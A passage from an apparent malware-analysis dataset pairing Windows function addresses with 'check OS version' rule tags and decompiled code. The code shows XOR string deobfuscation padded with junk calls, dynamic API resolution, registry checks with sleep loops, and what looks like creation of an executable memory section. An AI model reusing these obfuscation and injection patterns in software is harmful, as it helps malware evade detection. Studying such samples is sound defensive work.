(*var_8h)(&lpSystemInfo);\n    }\n    stack0xffffffe8 = 0x6c117133;\n    stack0xffffffec = 0x741f6b2e;\n    var_fh._3_1_ = 0x6c;\n    uStack15 = 0x41;\n    lpValueName = 0x6c74716b;\n    var_20h._0_1_ = 0x41;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    var_28h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n    uVar10 = 0;\n    do {\n        *(var_28h + uVar10) = *(var_28h + uVar10) + '\\x0f';\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x15);\n    iVar11 = 0;\n    *var_28h = 0;\n    var_28h[1] = 0;\n    var_28h[2] = 0;\n    var_28h[3] = 0;\n    var_28h[4] = 0;\n    *(var_28h + 5) = 0;\n    var_8h = &var_17h + (3 - var_28h);\n    do {\n        pcVar1 = var_28h + iVar11;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&lpValueName + iVar11 % 5);\n        uVar3 = pcVar1[var_8h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar11 = iVar11 + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n    } while (iVar11 < 10);\n    iVar11 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(reloc.WS2_32.dll_bind, name, &namelen);\n    puVar9 = var_30h;\n    pcVar15 = _sym.imp.KERNEL32.dll_HeapFree;\n    puVar13 = var_28h;\n    if (iVar11 == 0) {\n        stack0xffffffa4 = 0x4f3c4900;\n        var_54h = 0x49335202;\n        var_50h = 0x521e4f2b;\n        var_4ch = 0x4f214923;\n        var_48h = 0x491e521f;\n        var_44h = 0x52004f2f;\n        var_40h = 0x4f1d4935;\n        var_3ch = 0x49225219;\n        var_38h = 0x52034f27;\n        var_34h = 0x4f4e4937;\n        stack0xffffffec = 0x4f4e4950;\n        var_fh._3_1_ = 0x6d;\n        uStack15 = 0x52;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        uVar10 = 0;\n        do {\n            *(iVar11 + uVar10) = *(iVar11 + uVar10) ^ 0xfc;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x51);\n        lpValueName = iVar11;\n        sub.ntdll.dll_memset(iVar11, 0, 0x51);\n        var_8h = &var_5bh + (3 - iVar11);\n        iVar14 = 0;\n        do {\n            pcVar1 = iVar11 + iVar14;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_13h + iVar14 % 6 + 3);\n            uVar3 = pcVar1[var_8h];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar11 = lpValueName;\n            iVar14 = iVar14 + 1;\n            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        } while (iVar14 < 0x28);\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(namelen, lpValueName, 0, 0, &pszFirst, &lpcbData);\n        puVar13 = var_28h;\n        puVar9 = var_30h;\n        puVar12 = &pszFirst;\n        do {\n            iVar4 = *puVar12;\n            puVar12 = puVar12 + 2;\n        } while (iVar4 != 0);\n        if (puVar12 - (&pszFirst + 2) >> 1 != 0) {\n            while (iVar14 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&pszFirst, puVar13),  iVar14 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n        uVar10 = 0;\n        do {\n            *(iVar11 + uVar10) = *(iVar11 + uVar10) * var_c8h;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x51);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n        pcVar15 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    while ((var_fch == 0 && (var_100h < 2100000000))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        puVar9 = var_30h;\n    }\n    uVar10 = 0;\n    do {\n        *(puVar13 + uVar10) = *(puVar13 + uVar10) + '\\x18';\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x15);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar13);\n    (*pcVar15)(uVar8);\n    uVar10 = 0;\n    do {\n        *(name + uVar10) = *(name + uVar10) ^ 0x35;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0xbd);\n    uVar8 = (*pcVar5)(0, name);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n    uVar8 = (*pcVar5)(0, puVar9);\n    (*pcVar15)(uVar8);\n    uVar8 = (*pcVar5)(0, lpModuleName);\n    (*pcVar15)(uVar8);\n    return;\n}\n",
        "token_count": 3759
    },
    "00409411": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409411(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    char cVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint uVar12;\n    code *pcVar13;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar8 = *0x4279dc;\n    uVar12 = 0;\n    var_4h = 0;\n    var_ch = 0;\n    var_1ch = 0;\n    iVar7 = fcn.004089eb(&var_ch);\n    if (iVar7 != 0) {\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrDupW)(uVar8);\n        var_18h = iVar7;\n        var_14h = fcn.00403844();\n        pcVar13 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_14h != 0) {\n            var_30h = 0x6226514a;\n            var_2ch = 0x4f376409;\n            var_28h._0_2_ = 0x6762;\n            var_24h = 0x624f5164;\n            var_20h._0_1_ = 0x67;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            uVar9 = 0;\n            do {\n                *(var_8h + uVar9) = *(var_8h + uVar9) + -0x50;\n                uVar9 = uVar9 + 1;\n            } while (uVar9 < 0x15);\n            *var_8h = 0;\n            var_8h[1] = 0;\n            var_8h[2] = 0;\n            var_8h[3] = 0;\n            var_8h[4] = 0;\n            *(var_8h + 5) = 0;\n            iVar7 = 0;\n            var_10h = &var_30h - var_8h;\n            do {\n                pcVar1 = var_8h + iVar7;\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_24h + iVar7 % 5);\n                uVar3 = pcVar1[var_10h];\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar7 = iVar7 + 1;\n                *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n            } while (iVar7 < 10);\n            puVar11 = var_8h;\n            do {\n                iVar4 = *puVar11;\n                *((var_14h - var_8h) + puVar11) = iVar4;\n                puVar11 = puVar11 + 2;\n            } while (iVar4 != 0);\n            uVar9 = 0;\n            do {\n                *(var_8h + uVar9) = *(var_8h + uVar9) + -0x40;\n                pcVar13 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar9 = uVar9 + 1;\n            } while (uVar9 < 0x15);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            iVar7 = var_18h;\n            uVar12 = var_1ch;\n        }\n        iVar10 = fcn.00409d1f(var_ch);\n        if (iVar10 == 0) {\n            iVar10 = fcn.00408eb9();\n            if (iVar10 != 0) {\n                uVar12 = 1;\n            }\n        }\n        if (iVar7 != 0) {\n            uVar8 = (*pcVar13)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        uVar8 = (*pcVar13)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar12;\n}\n",
        "token_count": 1098
    },
    "0040adaf": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040adaf(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint lpModuleName;\n    \n    var_24h = 0x41d123d;\n    var_20h = 0xa37601c;\n    var_1ch._0_2_ = 0x6815;\n    var_18h = 0x68796653;\n    var_14h._0_2_ = 0x4e70;\n    var_10h = param_1;\n    fcn.0040826e(param_1);\n    iVar10 = 0;\n    do {\n        fcn.004034cf(iVar10, *(&var_18h + iVar10 % 6) ^ *(&var_24h + iVar10));\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 10);\n    var_3ch = 0x1c5b363d;\n    var_38h = 0x56363c42;\n    var_34h = 0x161c4326;\n    var_30h = 0x1c591658;\n    var_2ch = 0x59204507;\n    var_28h._0_2_ = 0x421d;\n    var_18h = 0x5237426f;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x36);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n    var_8h = 0;\n    *puVar7 = 0;\n    puVar7[1] = 0;\n    puVar7[2] = 0;\n    puVar7[3] = 0;\n    puVar7[4] = 0;\n    *(puVar7 + 5) = 0;\n    *(puVar7 + 0x16) = 0;\n    var_ch = &var_3ch - puVar7;\n    do {\n        iVar10 = var_8h;\n        pcVar1 = var_8h + puVar7;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_18h + iVar10 % 5);\n        uVar3 = pcVar1[var_ch];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_8h < 0x16);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar7);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    uVar6 = (*pcVar8)(var_10h);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n    uVar9 = (*pcVar8)(0, lpModuleName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    return uVar6;\n}\n",
        "token_count": 935
    },
    "0040af4b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040af4b(uint arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint extraout_ECX;\n    uint in_EDX;\n    uint var_3ch;\n    uint32_t var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    int32_t lpModuleName;\n    \n    var_10h = 0;\n    puVar7 = &var_28h;\n    for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_3ch._0_2_ = 0x3938;\n    var_3ch._2_1_ = 6;\n    stack0xffffffc3 = 0x1f111630;\n    var_35h = 0x1e3c28;\n    var_31h = 0x3f2e1314;\n    var_2dh._0_1_ = 0x38;\n    var_2dh._1_2_ = 0x2909;\n    var_2dh._3_1_ = 0x76;\n    var_20h = 0x514b4d76;\n    var_1ch._0_2_ = 0x4766;\n    var_14h = in_EDX;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n    lpModuleName = 0;\n    *puVar7 = 0;\n    puVar7[1] = 0;\n    puVar7[2] = 0;\n    puVar7[3] = 0;\n    puVar7[4] = 0;\n    var_8h = &var_3ch - puVar7;\n    var_ch = puVar7;\n    do {\n        iVar10 = lpModuleName;\n        pcVar1 = lpModuleName + puVar7;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_20h + iVar10 % 6);\n        uVar3 = pcVar1[var_8h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        lpModuleName = lpModuleName + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (lpModuleName < 0x13);\n    var_35h = var_35h & 0xff | 0x1d123d00;\n    var_31h = 0x37601c04;\n    var_2dh._0_1_ = 10;\n    var_2dh._1_2_ = 0x6815;\n    var_20h = 0x68796653;\n    var_1ch._0_2_ = 0x4e70;\n    fcn.0040826e(extraout_ECX);\n    iVar10 = 0;\n    do {\n        fcn.004034cf(iVar10, *(&var_20h + iVar10 % 6) ^ *(&var_35h + iVar10 + 1));\n        puVar7 = var_ch;\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 10);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_ch);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    (*pcVar8)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar6 = fcn.0040adaf();\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    uVar9 = (*pcVar8)(0, puVar7);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n    return uVar6;\n}\n",
        "token_count": 1092
    },
    "0040b0ae": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b0ae(uint param_1, uint param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    code *pcVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint lpLibFileName;\n    \n    var_24h = 0x41d123d;\n    var_20h = 0xa37601c;\n    var_1ch._0_2_ = 0x6815;\n    var_18h = 0x68796653;\n    var_14h._0_2_ = 0x4e70;\n    var_10h = param_2;\n    fcn.0040826e(param_1);\n    iVar11 = 0;\n    do {\n        fcn.004034cf(iVar11, *(&var_18h + iVar11 % 6) ^ *(&var_24h + iVar11));\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_3ch = 0x5b634c03;\n    var_38h = 0x60482c08;\n    var_34h = 0x773a005c;\n    var_30h = 0x2e006650;\n    var_2ch = 0xb5a5f4c;\n    var_28h._0_1_ = 0x4d;\n    var_18h = 0x3536384d;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x65);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_8h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    puVar8[3] = 0;\n    puVar8[4] = 0;\n    *(puVar8 + 5) = 0;\n    var_ch = &var_3ch - puVar8;\n    do {\n        iVar11 = var_8h;\n        pcVar1 = var_8h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_18h + iVar11 % 5);\n        uVar3 = pcVar1[var_ch];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_8h < 0x15);\n    uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar8);\n    pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n    (*pcVar9)(0xffffffff, var_10h);\n    uVar7 = fcn.0040adaf();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    uVar10 = (*pcVar4)(0, lpLibFileName);\n    (*pcVar9)(uVar10);\n    return uVar7;\n}\n",
        "token_count": 958
    },
    "0040b1e3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b1e3(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    uint *in_EDX;\n    uchar *puVar11;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint lpModuleName;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    puVar8 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar10 = 0x18; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_38h = 0x41d123d;\n    puVar8 = &var_2ch;\n    for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = &var_24h;\n    for (iVar10 = 8; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0xa37601c;\n    var_30h._0_2_ = 0x6815;\n    var_24h = 0x68796653;\n    var_20h._0_2_ = 0x4e70;\n    fcn.0040826e(0);\n    iVar10 = 0;\n    do {\n        fcn.004034cf(iVar10, *(&var_24h + iVar10 % 6) ^ *(&var_38h + iVar10));\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 10);\n    var_3ch = 0x22361a3a;\n    var_38h = 0x101a150e;\n    var_34h = 0x1a170e03;\n    var_30h._0_2_ = 0x3f1c;\n    var_30h._2_1_ = 5;\n    var_30h._3_1_ = 0x74;\n    var_24h = 0x50756e74;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6b);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_14h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    puVar8[3] = 0;\n    *(puVar8 + 4) = 0;\n    var_18h = &var_3ch - puVar8;\n    do {\n        iVar10 = var_14h;\n        pcVar1 = var_14h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_24h + iVar10 % 5);\n        uVar3 = pcVar1[var_18h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_14h = var_14h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_14h < 0x10);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar8);\n    pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar10 = (*pcVar9)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar10 < 0) {\n        iVar10 = fcn.0040adaf();\n    }\n    else {\n        iVar10 = fcn.0040af4b(&var_ch);\n        puVar11 = var_ch;\n        var_14h = iVar10;\n        if (iVar10 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar4)(0, lpModuleName);\n    (*pcVar9)(uVar7);\n    return iVar10;\n}\n",
        "token_count": 1465
    },
    "0040b528": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b528(uchar *param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint extraout_ECX;\n    code *pcVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    code *pcVar13;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3bh;\n    ushort var_37h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint lpModuleName;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_20h = param_1;\n    if ((((*0x427a40 | *0x427a44) == 0) || ((*0x427a48 | *0x427a4c) == 0)) || ((*0x427a50 | *0x427a54) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x41d123d;\n        var_30h = 0xa37601c;\n        var_2ch._0_2_ = 0x6815;\n        var_28h = 0x68796653;\n        var_24h._0_2_ = 0x4e70;\n        fcn.0040826e(param_1);\n        iVar10 = 0;\n        do {\n            fcn.004034cf(iVar10, *(&var_28h + iVar10 % 6) ^ *(&var_34h + iVar10));\n            uVar6 = lpModuleName;\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_10h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n        if (var_10h == 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            return var_4h;\n        }\n        var_34h = 0x7c235620;\n        var_30h = 0x7608332b;\n        var_2ch._0_2_ = 0x5c3d;\n        var_2ch._2_1_ = 0x44;\n        var_28h = 0x3051326c;\n        var_24h._0_2_ = 0x5244;\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        var_14h = NULL;\n        *puVar7 = 0;\n        puVar7[1] = 0;\n        puVar7[2] = 0;\n        var_18h = &var_34h - puVar7;\n        var_ch = puVar7;\n        do {\n            puVar8 = var_14h;\n            pcVar1 = var_14h + puVar7;\n            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_28h + puVar8 % 6);\n            uVar3 = pcVar1[var_18h];\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_14h = var_14h + 1;\n            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        } while (var_14h < 0xb);\n        *0x427a40 = fcn.0040e0cf();\n        *0x427a44 = *0x427a40 >> 0x1f;\n        if ((*0x427a40 | *0x427a44) == 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar13 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpModuleName);\n        }\n        else {\n            var_4ch._0_2_ = 0x3d03;\n            var_4ch._2_1_ = 1;\n            stack0xffffffb3 = 0x93b550f;\n            stack0xffffffb7 = 0x2a532701;\n            var_44h._3_1_ = 0x3d;\n            var_40h._0_1_ = 6;\n            var_40h._1_2_ = 0x553a;\n            stack0xffffffbf = 0x3d0e;\n            var_3bh._0_2_ = 0x3a17;\n            var_3bh._2_2_ = 0x3c55;\n            var_37h = 0x732a;\n            var_28h = 0x4873594f;\n            var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x30);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            puVar7 = puVar8;\n            for (iVar10 = 6; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_18h = 0;\n            var_1ch = &var_4ch - puVar8;\n            var_14h = puVar8;\n            do {\n                iVar10 = var_18h;\n                pcVar1 = var_18h + puVar8;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_28h + iVar10 % 5);\n                uVar3 = pcVar1[var_1ch];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_18h = var_18h + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (var_18h < 0x17);\n            *0x427a48 = fcn.0040e0cf();\n            *0x427a4c = *0x427a48 >> 0x1f;\n            pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((*0x427a48 | *0x427a4c) != 0) {\n                var_4ch._0_2_ = 0x1c03;\n                var_4ch._2_1_ = 5;\n                stack0xffffffb3 = 0xe2d2614;\n                stack0xffffffb7 = 0x301f1236;\n                var_44h._3_1_ = 0x19;\n                var_40h._0_1_ = 0x21;\n                var_40h._1_2_ = 0x2813;\n                stack0xffffffbf = 0x2635;\n                var_3bh._0_2_ = 0xb30;\n                var_3bh._2_2_ = 0x2b26;\n                var_37h = 0x5512;\n                var_28h = 0x66556b59;\n                var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x49);\n                fcn.0040cbe3(extraout_ECX);\n                iVar10 = var_1ch;\n                iVar11 = 0;\n                var_1ch = &var_4ch - var_1ch;\n                do {\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_28h + iVar11 % 5);\n                    uVar3 = *(var_1ch + iVar11 + iVar10);\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(iVar11 + iVar10) = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < 0x17);\n                *0x427a50 = fcn.0040e0cf();\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                *0x427a54 = *0x427a50 >> 0x1f;\n                if ((*0x427a50 | *0x427a54) != 0) {\n                    var_4h = 0;\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n                    uVar6 = (*pcVar9)(0, var_14h);\n                    pcVar13 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                    uVar6 = (*pcVar9)(0, var_ch);\n                    